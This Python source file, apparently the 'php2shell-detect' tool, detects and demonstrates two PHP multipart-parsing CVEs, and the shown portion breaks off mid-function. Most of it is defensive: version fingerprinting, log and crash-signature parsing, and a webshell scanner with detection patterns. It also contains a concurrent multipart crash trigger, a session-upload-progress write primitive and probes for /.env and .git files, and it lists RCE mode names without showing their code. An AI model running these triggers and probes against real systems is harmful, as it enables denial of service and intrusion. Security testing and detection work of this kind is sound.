#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell-detect.py  v3.4
Defensive detector + offensive impact-evidence builder for
CVE-2026-109618 / CVE-2026-109619 ("PHP2Shell").

This tool is DEFENSIVE-FIRST with a BOUNDED offensive component.
The offensive modes prove real-world IMPACT of the CVEs on targets
the operator explicitly owns (via --i-own-this-target). They do
NOT execute remote commands, install persistent backdoors, or
extract/credit-card data. They map the post-crash primitives to
concrete attacker capabilities so blue teams and CISOs understand
exactly what the vulnerability buys an attacker.

v3.4 = v3.2 (full defensive surface) + v3.3 (concurrency, profiles,
CI/CD, memory-disclosure) + new bounded offensive layer.

Author : NULL200OK (https://github.com/NULL200OK)
License: MIT
Repo   : https://github.com/NULL200OK/php2shell-detect
"""

import argparse
import gzip
import hashlib
import json
import os
import re
import shutil
import socket
import ssl
import statistics
import subprocess
import sys
import time
import uuid
from collections import defaultdict, Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from urllib.parse import urlparse, quote
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

# ---------------------------------------------------------------- constants
SAFE_BY_BRANCH = {(8, 5): (8, 5, 12), (8, 4): (8, 4, 27),
                  (8, 3): (8, 3, 36), (8, 2): (8, 2, 35)}
MIN_SAFE = (8, 2, 35)
CVE_IDS = ("CVE-2026-109618", "CVE-2026-109619")
CVSS = {"CVE-2026-109618": 9.2, "CVE-2026-109619": 9.2}
DEFAULT_UA = "php2shell-detect/3.5 (+defensive triage; https://github.com/NULL200OK)"

EXIT_SAFE = 0
EXIT_UNKNOWN = 1
EXIT_VULNERABLE = 2
EXIT_ERROR = 3

VER_RE = re.compile(r"(\d+)\.(\d+)\.(\d+)(?![\d.])")
PHP_HDR_RE = re.compile(r"PHP/(\d+\.\d+\.\d+)", re.I)
PHPINFO_RE = re.compile(r"PHP Version\s*(?:=>|:)\s*(\d+\.\d+\.\d+)", re.I)
PHPINFO_TITLE_RE = re.compile(r"<title>\s*PHP\s+(\d+\.\d+\.\d+)", re.I)

OOM_RE = re.compile(r"Allowed memory size of \d+ bytes exhausted", re.I)
UAF_RE = re.compile(
    r"Fatal error:.*(use after free|heap[- ]buffer|segmentation fault|"
    r"zend_mm_heap corrupted|invalid pointer|double free)", re.I)
ASAN_HEADER_RE = re.compile(r"ERROR: AddressSanitizer:\s*([\w-]+)", re.I)
ASAN_FRAME_RE = re.compile(r"#\d+\s+0x[0-9a-f]+\s+in\s+(\w+)\s", re.I)

ACCESS_RE = re.compile(
    r'^(?P<ip>\S+)\s+\S+\s+\S+\s+\[(?P<ts>[^\]]+)\]\s+'
    r'"(?P<method>[A-Z]+)\s+(?P<path>\S+)\s+[^"]*"\s+(?P<status>\d{3})\s')
EMPTY_FILE_RE = re.compile(
    r'Content-Disposition:\s*form-data;[^\r\n]*filename=""', re.I)

SURFACE_RE = re.compile(
    r'<form\b[^>]*?enctype\s*=\s*["\']?multipart/form-data[^>]*>', re.I | re.S)
FILE_INPUT_RE = re.compile(r'<input\b[^>]*?type\s*=\s*["\']?file', re.I)
FORM_ACTION_RE = re.compile(r'action\s*=\s*["\']([^"\']+)', re.I)
POST_FORM_RE = re.compile(r'<form\b[^>]*?method\s*=\s*["\']?post', re.I)

WEBSHELL_NAME_RE = re.compile(
    r"^(?:shell|cmd|upload|wso|b374k|c99|r57|alfa|pwn|hack|test)\d*"
    r"\.(?:php|phtml|phar)$", re.I)
WEBSHELL_CONTENT_RE = re.compile(
    rb"eval\s*\(\s*(?:base64_decode|gzinflate|str_rot13|\\?\$_(POST|GET|REQUEST))",
    re.I)

DEEP_PROBE_PATHS = [
    "/", "/index.php", "/phpinfo.php", "/info.php", "/test.php",
    "/wp-login.php", "/admin.php", "/composer.json", "/composer.lock",
    "/.env", "/Dockerfile", "/docker-compose.yml", "/backup.zip",
    "/.git/HEAD", "/server-status", "/server-info",
]

SIG_PATTERNS = {
    "oom":          re.compile(r"Allowed memory size of (\d+) bytes exhausted", re.I),
    "uaf":          re.compile(r"use[- ]after[- ]free", re.I),
    "heap_corrupt": re.compile(r"zend_mm_heap corrupted", re.I),
    "segfault":     re.compile(r"segmentation fault|SIGSEGV", re.I),
    "invalid_ptr":  re.compile(r"invalid pointer", re.I),
    "double_free":  re.compile(r"double free|double-free", re.I),
}
SIG_TS_RE = re.compile(
    r"\[([A-Z][a-z]{2}\s+[A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}\.\d+\s+\d{4})\]")
SIG_IP_RE = re.compile(r"client(?:\s+IP)?\s*:?\s*(\d{1,3}(?:\.\d{1,3}){3})")

MEM_DISCLOSURE_PATTERNS = [
    (rb"\x00{4,}", "null_byte_runs"),
    (rb"[\x80-\xff]{16,}", "high_byte_garbage"),
    (rb"/home/[A-Za-z_][\w.-]*/php", "php_home_path"),
    (rb"/var/www/[^\x00-\x1f\"<>\s]+", "docroot_path"),
    (rb"Zend(?:Engine|MM|MMHeap|\w+Allocator)", "zend_internals"),
    (rb"0x[0-9a-fA-F]{8,16}", "pointer_leak"),
    (rb"opcode\d*|ZEND_OPCODE", "opcode_leak"),
    (rb"sess_[a-f0-9]{26,40}", "session_id_leak"),
    (rb"htdocs|public_html|/usr/local/bin/php", "server_path_leak"),
]

PROFILES = {
    "quick":       ["remote", "surface"],
    "standard":    ["remote", "surface", "local", "logs", "audit"],
    "deep":        ["remote", "surface", "deep-fingerprint", "local",
                    "logs", "audit", "asan", "error-signature"],
    "impact":      ["lab-verify", "crash-repro", "impact-memory-disclosure"],
    "offensive":   ["offensive-session-lfi", "offensive-session-traversal",
                    "offensive-upload-bypass-verify",
                    "offensive-race-poison-confirm"],
    "offensive-rce": ["offensive-phpcode-exec-proof",
                      "offensive-filter-chain-rce",
                      "offensive-phar-deserialization",
                      "offensive-tmpfile-race",
                      "offensive-log-poisoning"],
    "full":        ["remote", "surface", "deep-fingerprint", "local",
                    "logs", "audit", "asan", "error-signature",
                    "lab-verify", "crash-repro", "impact-memory-disclosure"],
    "full+offensive": ["remote", "surface", "deep-fingerprint", "local",
                       "logs", "audit", "asan", "error-signature",
                       "lab-verify", "crash-repro", "impact-memory-disclosure",
                       "offensive-session-lfi", "offensive-session-traversal",
                       "offensive-upload-bypass-verify",
                       "offensive-race-poison-confirm"],
    "full+rce":    ["remote", "surface", "deep-fingerprint", "local",
                    "logs", "audit", "asan", "error-signature",
                    "lab-verify", "crash-repro", "impact-memory-disclosure",
                    "offensive-session-lfi", "offensive-session-traversal",
                    "offensive-upload-bypass-verify",
                    "offensive-race-poison-confirm",
                    "offensive-phpcode-exec-proof",
                    "offensive-filter-chain-rce",
                    "offensive-phar-deserialization",
                    "offensive-tmpfile-race",
                    "offensive-log-poisoning"],
    "local-only":  ["local", "logs", "audit", "asan", "error-signature"],
}

VERDICT_WEIGHTS = {"vulnerable": +2, "safe": -1, "unknown": 0}


class C:
    OK = "\033[92m" if sys.stdout.isatty() else ""
    BAD = "\033[91m" if sys.stdout.isatty() else ""
    WARN = "\033[93m" if sys.stdout.isatty() else ""
    DIM = "\033[2m" if sys.stdout.isatty() else ""
    BOLD = "\033[1m" if sys.stdout.isatty() else ""
    RST = "\033[0m" if sys.stdout.isatty() else ""


# ---------------------------------------------------------------- helpers
def parse_version(text):
    if not text:
        return None
    m = VER_RE.search(text)
    return tuple(int(x) for x in m.groups()) if m else None


def fmt(v):
    return ".".join(map(str, v)) if v else "unknown"


def verdict(v):
    if v is None:
        return "unknown"
    branch = (v[0], v[1])
    safe = SAFE_BY_BRANCH.get(branch)
    if safe is not None:
        return "safe" if v >= safe else "vulnerable"
    return "safe" if v >= MIN_SAFE else "vulnerable"


def run(cmd, timeout=10):
    try:
        return subprocess.run(cmd, capture_output=True, text=True,
                              timeout=timeout, check=False)
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        return None


def http_get(url, timeout, ua, insecure=False, extra_headers=None):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    headers = {"User-Agent": ua, "Accept": "*/*"}
    if extra_headers:
        headers.update(extra_headers)
    req = Request(url, headers=headers, method="GET")
    try:
        with urlopen(req, timeout=timeout, context=ctx) as r:
            return dict(r.headers.items()), r.read(64 * 1024), r.status
    except HTTPError as e:
        hdrs = dict(e.headers.items()) if e.headers else {}
        try:
            body = e.read(64 * 1024)
        except Exception:
            body = b""
        return hdrs, body, e.code
    except (URLError, socket.timeout, OSError, ssl.SSLError):
        return None, None, None


def http_head(url, timeout, ua, insecure=False):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    req = Request(url, headers={"User-Agent": ua}, method="HEAD")
    try:
        with urlopen(req, timeout=timeout, context=ctx) as r:
            return dict(r.headers.items()), None, r.status
    except HTTPError as e:
        return (dict(e.headers.items()) if e.headers else {}), None, e.code
    except (URLError, socket.timeout, OSError, ssl.SSLError):
        return None, None, None


def http_post(url, body, headers, timeout, insecure=False, read_bytes=64*1024):
    """Centralized POST with TLS fallback. Returns (status, body, err)."""
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    req = Request(url, data=body, headers=headers, method="POST")
    try:
        with urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read(read_bytes), None
    except HTTPError as e:
        try:
            b = e.read(read_bytes)
        except Exception:
            b = b""
        return e.code, b, None
    except (URLError, socket.timeout, OSError, ssl.SSLError) as e:
        return None, b"", type(e).__name__


def body_hash(body):
    if not body:
        return None
    return hashlib.sha256(body).hexdigest()[:16]


def now_iso():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _json_safe(obj):
    if isinstance(obj, Counter):
        return dict(obj)
    if isinstance(obj, (set, tuple)):
        return list(obj)
    if isinstance(obj, dict):
        return {k: _json_safe(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_json_safe(v) for v in obj]
    return obj


def make_multipart_body(fields, field_prefix="f"):
    """Build a multipart body with N empty-filename parts (crash trigger)."""
    boundary = uuid.uuid4().hex
    parts = []
    for i in range(fields):
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field_prefix}{i}"; filename=""\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n\r\n")
    body = ("".join(parts) + f"--{boundary}--\r\n").encode()
    return boundary, body


def log(msg, level="info", quiet=False):
    if quiet:
        return
    prefix = {
        "info":  f"{C.DIM}[*]{C.RST}",
        "ok":    f"{C.OK}[+]{C.RST}",
        "warn":  f"{C.WARN}[!]{C.RST}",
        "bad":   f"{C.BAD}[-]{C.RST}",
        "step":  f"{C.BOLD}[>]{C.RST}",
    }.get(level, "[*]")
    print(f"{prefix} {msg}", flush=True)


def progress(current, total, label=""):
    if not sys.stdout.isatty():
        return
    pct = int(100 * current / total) if total else 0
    bar = "#" * (pct // 5) + "-" * (20 - pct // 5)
    sys.stdout.write(f"\r{C.DIM}[{bar}] {pct:3d}% {label}{C.RST}   ")
    sys.stdout.flush()
    if current >= total:
        sys.stdout.write("\r" + " " * 60 + "\r")
        sys.stdout.flush()


def tag(v):
    return {"safe": f"{C.OK}[SAFE]{C.RST}",
            "vulnerable": f"{C.BAD}[VULN]{C.RST}",
            "unknown": f"{C.WARN}[ ? ]{C.RST}"}.get(v, f"[{v}]")



# ---------------------------------------------------------------- mode: remote
def check_remote(url, timeout, ua, insecure, probe_phpinfo):
    result = {"mode": "remote", "url": url, "headers_seen": {},
              "php_version": None, "php_confirmed": False,
              "verdict": "unknown", "notes": []}
    hdrs, body, status = http_get(url, timeout, ua, insecure)
    if hdrs is None and url.startswith("https://"):
        alt = "http://" + url[len("https://"):]
        result["notes"].append(f"https failed, retrying over {alt}")
        hdrs, body, status = http_get(alt, timeout, ua, insecure)
        url = alt
        result["url"] = url
    if hdrs is None:
        result["notes"].append("unreachable (timeout / DNS / TLS failure)")
        return result
    result["status"] = status
    result["body_hash"] = body_hash(body)
    for k in ("Server", "X-Powered-By"):
        if k in hdrs:
            result["headers_seen"][k] = hdrs[k]
    if any("PHPSESSID" in v for v in hdrs.values()):
        result["php_confirmed"] = True
        result["notes"].append("PHPSESSID cookie present -> PHP confirmed")
    m = PHP_HDR_RE.search(hdrs.get("X-Powered-By", "") or "")
    if m:
        result["php_version"] = m.group(1)
        result["php_confirmed"] = True
    if body:
        text = body.decode("utf-8", "replace")
        for rx in (PHPINFO_RE, PHPINFO_TITLE_RE):
            m = rx.search(text)
            if m:
                result["php_version"] = m.group(1)
                result["php_confirmed"] = True
                result["notes"].append("phpinfo-style output found")
                break
    if result["php_version"] is None and probe_phpinfo:
        base = url.rstrip("/")
        for candidate in ("/phpinfo.php", "/info.php", "/test.php"):
            h2, b2, _ = http_get(base + candidate, timeout, ua, insecure)
            if b2 and b"PHP Version" in b2:
                m = PHPINFO_RE.search(b2.decode("utf-8", "replace"))
                if m:
                    result["php_version"] = m.group(1)
                    result["php_confirmed"] = True
                    result["notes"].append(f"phpinfo exposed at {candidate}")
                break
    v = parse_version(result["php_version"])
    result["verdict"] = verdict(v)
    return result


# ---------------------------------------------------------------- mode: surface
def check_surface(url, timeout, ua, insecure):
    out = {"mode": "surface", "url": url, "multipart_forms": [],
           "post_forms": 0, "file_inputs": 0, "verdict": "unknown",
           "notes": []}
    base = url.rstrip("/")
    pages = ["/", "/contact.php", "/contact", "/upload.php", "/upload"]
    seen = set()
    for page in pages:
        full = base + page
        if full in seen:
            continue
        seen.add(full)
        hdrs, body, status = http_get(full, timeout, ua, insecure)
        if not body or (status and status >= 400 and page != "/"):
            continue
        text = body.decode("utf-8", "replace")
        out["file_inputs"] += len(FILE_INPUT_RE.findall(text))
        out["post_forms"] += len(POST_FORM_RE.findall(text))
        for m in SURFACE_RE.finditer(text):
            act = FORM_ACTION_RE.search(m.group(0))
            action = act.group(1) if act else "(no action)"
            if action not in out["multipart_forms"]:
                out["multipart_forms"].append(action)
    if out["multipart_forms"] or out["file_inputs"] > 0:
        out["verdict"] = "vulnerable"
        out["notes"].append(
            "multipart/form-data handling confirmed from HTML; "
            "the PHP request parser (where CVE-2026-109618 lives) "
            "runs on every such submission, before any application code")
    elif out["post_forms"] > 0:
        out["verdict"] = "unknown"
        out["notes"].append("POST forms exist but no multipart detected")
    else:
        out["verdict"] = "safe"
    return out


# ---------------------------------------------------------------- mode: deep-fingerprint
def check_deep_fingerprint(url, timeout, ua, insecure):
    out = {"mode": "deep-fingerprint", "url": url, "hits": [],
           "version_sources": [], "verdict": "unknown", "notes": []}
    base = url.rstrip("/")
    found_versions = {}
    for path in DEEP_PROBE_PATHS:
        full = base + path
        hdrs, body, status = http_get(full, timeout, ua, insecure)
        if hdrs is None:
            continue
        text = (body or b"").decode("utf-8", "replace")
        entry = {"path": path, "status": status,
                 "len": len(body or b""), "hash": body_hash(body),
                 "server": hdrs.get("Server"),
                 "xpb": hdrs.get("X-Powered-By")}
        for hdr_name, hdr_val in hdrs.items():
            m = PHP_HDR_RE.search(hdr_val or "")
            if m:
                found_versions[hdr_name] = m.group(1)
                entry["php_hdr"] = m.group(1)
        m = PHPINFO_RE.search(text) or PHPINFO_TITLE_RE.search(text)
        if m:
            found_versions[f"body@{path}"] = m.group(1)
            entry["php_body"] = m.group(1)
        if path in ("/.env", "/composer.json", "/.git/HEAD",
                    "/docker-compose.yml", "/backup.zip") and status == 200:
            entry["exposure"] = True
            out["notes"].append(f"sensitive file exposed: {path}")
        out["hits"].append(entry)
    out["version_sources"] = [{"source": k, "version": v}
                              for k, v in found_versions.items()]
    versions = list(found_versions.values())
    if versions:
        v = parse_version(versions[0])
        out["verdict"] = verdict(v)
        out["php_version"] = fmt(v)
        if len(set(versions)) > 1:
            out["notes"].append(f"inconsistent version disclosures: {set(versions)}")
    return out


# ---------------------------------------------------------------- mode: local
PHP_BIN_CANDIDATES = ["php", "php8.5", "php8.4", "php8.3", "php8.2", "php8.1",
                      "php-fpm8.5", "php-fpm8.4", "php-fpm8.3",
                      "php-fpm8.2", "php-fpm8.1"]


def check_local():
    out = {"mode": "local", "binaries": [], "debian": None, "rpm": None,
           "fpm_running": None, "notes": [], "verdict": "unknown"}
    for name in PHP_BIN_CANDIDATES:
        path = shutil.which(name)
        if not path:
            continue
        r = run([path, "-v"])
        if not r or r.returncode != 0:
            continue
        first = ((r.stdout or "") + (r.stderr or "")).splitlines()[0]
        v = parse_version(first)
        out["binaries"].append({"name": name, "path": path, "raw": first.strip(),
                                "version": fmt(v), "verdict": verdict(v)})
    pr = run(["pgrep", "-af", "php-fpm"])
    if pr and pr.returncode == 0 and pr.stdout.strip():
        out["fpm_running"] = pr.stdout.strip().splitlines()
    docroot = "/usr/share/doc"
    if os.path.isdir(docroot):
        hits = []
        for pkg in sorted(os.listdir(docroot)):
            if not pkg.startswith("php"):
                continue
            for fn in ("changelog.Debian.gz", "changelog.gz", "changelog"):
                path = os.path.join(docroot, pkg, fn)
                if not os.path.isfile(path):
                    continue
                try:
                    if fn.endswith(".gz"):
                        with gzip.open(path, "rt", errors="replace") as f:
                            text = f.read(2_000_000)
                    else:
                        with open(path, "r", errors="replace") as f:
                            text = f.read(2_000_000)
                except OSError:
                    continue
                hits.append({"package": pkg, "file": path,
                             "cve_hits": [c for c in CVE_IDS if c in text]})
                break
        out["debian"] = hits
    if shutil.which("rpm"):
        for pkg in ("php-common", "php"):
            r = run(["rpm", "-q", "--changelog", pkg])
            if r and r.returncode == 0:
                out["rpm"] = {"package": pkg,
                              "cve_hits": [c for c in CVE_IDS if c in r.stdout]}
                break
    vs = [b["verdict"] for b in out["binaries"]]
    if "vulnerable" in vs:
        out["verdict"] = "vulnerable"
    elif vs and all(x == "safe" for x in vs):
        out["verdict"] = "safe"
    return out


# ---------------------------------------------------------------- mode: logs
def check_logs(paths, max_lines, post_500_threshold):
    out = {"mode": "logs", "files": [], "oom_total": 0, "uaf_total": 0,
           "timeout_total": 0, "suspicious_ips": {}, "verdict": "unknown"}
    per_ip = defaultdict(lambda: {"post_5xx": 0, "paths": set()})
    for path in paths:
        entry = {"path": path, "lines": 0, "oom": 0, "uaf": 0,
                 "timeout": 0, "post_5xx": 0, "error": None}
        if not os.path.isfile(path):
            entry["error"] = "file not found"
            out["files"].append(entry)
            continue
        try:
            with open(path, "r", errors="replace") as f:
                for i, line in enumerate(f):
                    if i >= max_lines:
                        entry["error"] = f"truncated at {max_lines}"
                        break
                    entry["lines"] += 1
                    if OOM_RE.search(line):
                        entry["oom"] += 1
                    if UAF_RE.search(line):
                        entry["uaf"] += 1
                    if "Maximum execution time" in line:
                        entry["timeout"] += 1
                    m = ACCESS_RE.match(line)
                    if m and m.group("method") == "POST" and m.group("status").startswith("5"):
                        entry["post_5xx"] += 1
                        per_ip[m.group("ip")]["post_5xx"] += 1
                        per_ip[m.group("ip")]["paths"].add(m.group("path")[:120])
        except OSError as e:
            entry["error"] = str(e)
        out["files"].append(entry)
        out["oom_total"] += entry["oom"]
        out["uaf_total"] += entry["uaf"]
        out["timeout_total"] += entry["timeout"]
    for ip, d in per_ip.items():
        if d["post_5xx"] >= post_500_threshold:
            out["suspicious_ips"][ip] = {"post_5xx": d["post_5xx"],
                                         "sample_paths": sorted(d["paths"])[:5]}
    if out["uaf_total"] > 0 or out["oom_total"] >= 5 or out["suspicious_ips"]:
        out["verdict"] = "vulnerable"
    elif out["oom_total"] > 0 or out["timeout_total"] > 0:
        out["verdict"] = "unknown"
    else:
        out["verdict"] = "safe"
    return out


# ---------------------------------------------------------------- mode: audit
def check_audit(path, max_lines, threshold):
    out = {"mode": "audit", "path": path, "empty_file_parts": 0,
           "lines": 0, "verdict": "unknown", "error": None}
    if not os.path.isfile(path):
        out["error"] = "file not found"
        return out
    try:
        with open(path, "r", errors="replace") as f:
            for i, line in enumerate(f):
                if i >= max_lines:
                    out["error"] = f"truncated at {max_lines}"
                    break
                out["lines"] += 1
                out["empty_file_parts"] += len(EMPTY_FILE_RE.findall(line))
    except OSError as e:
        out["error"] = str(e)
        return out
    out["verdict"] = ("vulnerable" if out["empty_file_parts"] >= threshold
                      else "unknown" if out["empty_file_parts"] > 0 else "safe")
    return out


# ---------------------------------------------------------------- mode: asan
def check_asan(paths):
    out = {"mode": "asan", "reports": [], "verdict": "unknown"}
    for path in paths:
        item = {"path": path, "error_type": None, "frames": [],
                "lines": 0, "error": None}
        if not os.path.isfile(path):
            item["error"] = "file not found"
            out["reports"].append(item)
            continue
        try:
            with open(path, "r", errors="replace") as f:
                for i, line in enumerate(f):
                    if i >= 200_000:
                        break
                    item["lines"] += 1
                    if not item["error_type"]:
                        m = ASAN_HEADER_RE.search(line)
                        if m:
                            item["error_type"] = m.group(1)
                    if line.lstrip().startswith("#"):
                        m = ASAN_FRAME_RE.search(line)
                        if m and len(item["frames"]) < 15:
                            item["frames"].append(m.group(1))
        except OSError as e:
            item["error"] = str(e)
        out["reports"].append(item)
    hits = [r for r in out["reports"]
            if r["error_type"] in
            ("heap-use-after-free", "heap-buffer-overflow", "double-free")]
    if hits:
        out["verdict"] = "vulnerable"
    elif any(r["error_type"] for r in out["reports"]):
        out["verdict"] = "unknown"
    else:
        out["verdict"] = "safe"
    return out


# ---------------------------------------------------------------- mode: error-signature
def check_error_signature(paths, max_lines):
    out = {"mode": "error-signature", "files": [], "categories": Counter(),
           "correlations": [], "verdict": "unknown"}
    for path in paths:
        entry = {"path": path, "lines": 0, "error": None,
                 "counts": Counter(), "examples": []}
        if not os.path.isfile(path):
            entry["error"] = "file not found"
            out["files"].append(entry)
            continue
        try:
            with open(path, "r", errors="replace") as f:
                for i, line in enumerate(f):
                    if i >= max_lines:
                        entry["error"] = f"truncated at {max_lines}"
                        break
                    entry["lines"] += 1
                    for cat, rx in SIG_PATTERNS.items():
                        if rx.search(line):
                            entry["counts"][cat] += 1
                            out["categories"][cat] += 1
                            if len(entry["examples"]) < 8:
                                ts = SIG_TS_RE.search(line)
                                ip = SIG_IP_RE.search(line)
                                entry["examples"].append({
                                    "category": cat,
                                    "timestamp": ts.group(1) if ts else None,
                                    "client_ip": ip.group(1) if ip else None,
                                    "raw": line.strip()[:400],
                                })
                            break
        except OSError as e:
            entry["error"] = str(e)
        out["files"].append(entry)
    ex = []
    for f in out["files"]:
        ex.extend(f["examples"])
    by_ts = [e for e in ex if e["timestamp"]]
    for i, e in enumerate(by_ts):
        for e2 in by_ts[i + 1:i + 30]:
            if e["client_ip"] and e["client_ip"] == e2["client_ip"] \
                    and e["category"] != e2["category"]:
                out["correlations"].append({
                    "client_ip": e["client_ip"],
                    "categories": sorted({e["category"], e2["category"]}),
                    "timestamps": [e["timestamp"], e2["timestamp"]],
                })
                break
    if out["categories"].get("uaf") or out["categories"].get("heap_corrupt") \
            or out["categories"].get("segfault"):
        out["verdict"] = "vulnerable"
    elif out["categories"].get("oom", 0) >= 3 or out["correlations"]:
        out["verdict"] = "vulnerable"
    elif out["categories"]:
        out["verdict"] = "unknown"
    else:
        out["verdict"] = "safe"
    out["categories"] = dict(out["categories"])
    for f in out["files"]:
        f["counts"] = dict(f["counts"])
    return out


# ---------------------------------------------------------------- mode: differential
def check_differential(url_a, url_b, timeout, ua, insecure):
    out = {"mode": "differential", "url_a": url_a, "url_b": url_b,
           "probes": [], "differences": [], "verdict": "unknown"}
    probes = [
        ("GET", "/"), ("HEAD", "/"),
        ("GET", "/index.php"), ("GET", "/phpinfo.php"),
        ("GET", "/nonexistent-" + uuid.uuid4().hex[:6]),
    ]
    for method, path in probes:
        a = b = None
        if method == "HEAD":
            a = http_head(url_a.rstrip("/") + path, timeout, ua, insecure)
            b = http_head(url_b.rstrip("/") + path, timeout, ua, insecure)
        else:
            a = http_get(url_a.rstrip("/") + path, timeout, ua, insecure)
            b = http_get(url_b.rstrip("/") + path, timeout, ua, insecure)
        ha, ba, sa = a if a else (None, None, None)
        hb, bb, sb = b if b else (None, None, None)
        entry = {"method": method, "path": path,
                 "a_status": sa, "b_status": sb,
                 "a_hash": body_hash(ba), "b_hash": body_hash(bb),
                 "a_server": (ha or {}).get("Server"),
                 "b_server": (hb or {}).get("Server"),
                 "a_xpb": (ha or {}).get("X-Powered-By"),
                 "b_xpb": (hb or {}).get("X-Powered-By"), "diff": None}
        diffs = []
        if sa != sb:
            diffs.append(f"status: {sa} vs {sb}")
        if entry["a_hash"] and entry["b_hash"] and entry["a_hash"] != entry["b_hash"]:
            diffs.append(f"body-hash: {entry['a_hash']} vs {entry['b_hash']}")
        if entry["a_xpb"] != entry["b_xpb"]:
            diffs.append(f"X-Powered-By: {entry['a_xpb']} vs {entry['b_xpb']}")
        entry["diff"] = diffs
        out["probes"].append(entry)
        if diffs:
            out["differences"].append({"method": method, "path": path,
                                       "details": diffs})
    xpb_diffs = [d for d in out["differences"]
                 if "X-Powered-By" in " ".join(d["details"])]
    status_diffs = [d for d in out["differences"]
                    if "status:" in " ".join(d["details"])]
    if xpb_diffs or status_diffs:
        out["verdict"] = "vulnerable" if xpb_diffs else "unknown"
    elif out["differences"]:
        out["verdict"] = "unknown"
    else:
        out["verdict"] = "safe"
    return out


# ---------------------------------------------------------------- mode: ioc (webshell scanner)
def check_ioc(root, max_files):
    out = {"mode": "ioc", "root": root, "suspicious_names": [],
           "suspicious_content": [], "files_scanned": 0,
           "verdict": "unknown", "error": None}
    if not os.path.isdir(root):
        out["error"] = "not a directory"
        return out
    count = 0
    for dirpath, _, files in os.walk(root):
        for fn in files:
            count += 1
            if count > max_files:
                out["error"] = f"stopped at {max_files} files"
                break
            out["files_scanned"] = count
            full = os.path.join(dirpath, fn)
            if WEBSHELL_NAME_RE.match(fn):
                out["suspicious_names"].append(full)
            if fn.lower().endswith((".php", ".phtml", ".phar")):
                try:
                    with open(full, "rb") as f:
                        head = f.read(8192)
                    if WEBSHELL_CONTENT_RE.search(head):
                        out["suspicious_content"].append(full)
                except OSError:
                    pass
        else:
            continue
        break
    if out["suspicious_names"] or out["suspicious_content"]:
        out["verdict"] = "vulnerable"
    else:
        out["verdict"] = "safe"
    return out


# ---------------------------------------------------------------- mode: lab-verify (concurrent)
def _lab_verify_round(target, round_idx, fields, timeout, ua, insecure, dry_run):
    boundary, body = make_multipart_body(fields)
    if dry_run:
        return {"round": round_idx, "dry_run": True, "fields": fields,
                "body_size_bytes": len(body),
                "note": "would POST to " + target}
    headers = {"User-Agent": ua,
               "Content-Type": f"multipart/form-data; boundary={boundary}",
               "Content-Length": "0"}
    t0 = time.time()
    status, _, err = http_post(target, body, headers, timeout, insecure)
    dt = time.time() - t0
    crashed = (status is not None and status >= 500) or err in (
        "ConnectionResetError", "RemoteDisconnected", "timeout")
    return {"round": round_idx, "status": status, "error": err,
            "elapsed_s": round(dt, 3), "fields": fields, "crashed": crashed}


def lab_verify(target, timeout, ua, insecure, rounds, fields,
               dry_run=False, workers=4, quiet=False):
    info = {"mode": "lab-verify", "target": target, "rounds": [],
            "crashes": 0, "verdict": "unknown", "notes": [],
            "dry_run": dry_run, "workers": workers}
    if dry_run:
        for r in range(rounds):
            info["rounds"].append(_lab_verify_round(
                target, r, fields, timeout, ua, insecure, True))
        info["verdict"] = "unknown"
        info["notes"].append("dry-run: no requests were sent")
        return info
    log(f"lab-verify: {rounds} rounds x {fields} fields ({workers} workers)",
        "step", quiet)
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(_lab_verify_round, target, r, fields,
                               timeout, ua, insecure, False): r
                   for r in range(rounds)}
        for i, fut in enumerate(as_completed(futures)):
            res = fut.result()
            info["rounds"].append(res)
            if res.get("crashed"):
                info["crashes"] += 1
            if sys.stdout.isatty() and not quiet:
                progress(i + 1, rounds, "lab-verify")
    info["rounds"].sort(key=lambda x: x["round"])
    if info["crashes"] >= 2:
        info["verdict"] = "vulnerable"
        info["notes"].append(
            "repeated 5xx / reset = OOM crash primitive reached. "
            "For memory-corruption proof, reproduce under ASAN.")
    elif info["crashes"] == 1:
        info["verdict"] = "unknown"
    else:
        info["verdict"] = "safe"
    return info


# ---------------------------------------------------------------- impact: session-write
def impact_session_write(target, session_id, marker, timeout, ua, insecure):
    out = {"mode": "impact-session-write", "target": target,
           "session_id": session_id, "marker": marker,
           "request_sent": False, "response_status": None,
           "verdict": "unknown", "notes": []}
    boundary = uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{marker}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="x.txt"\r\n'
        f"Content-Type: text/plain\r\n\r\nAAAA\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    headers = {"User-Agent": ua,
               "Content-Type": f"multipart/form-data; boundary={boundary}",
               "Cookie": f"PHPSESSID={session_id}"}
    status, _, err = http_post(target, body, headers, timeout, insecure)
    out["response_status"] = status
    out["request_sent"] = (err is None or status is not None)
    if err and status is None:
        out["notes"].append(f"request failed: {err}")
    return out


def check_session_file(path, marker):
    out = {"path": path, "exists": False, "marker_found": False,
           "size": 0, "preview": None, "verdict": "unknown"}
    if not os.path.isfile(path):
        return out
    out["exists"] = True
    out["size"] = os.path.getsize(path)
    try:
        with open(path, "r", errors="replace") as f:
            content = f.read(4096)
        out["preview"] = content[:200]
        out["marker_found"] = marker in content
    except OSError as e:
        out["notes"] = str(e)
    out["verdict"] = "vulnerable" if out["marker_found"] else "safe"
    return out


# ---------------------------------------------------------------- impact: crash-repro (concurrent)
def _crash_repro_round(target, round_idx, fields, timeout, ua, insecure):
    boundary, body = make_multipart_body(fields)
    headers = {"User-Agent": ua,
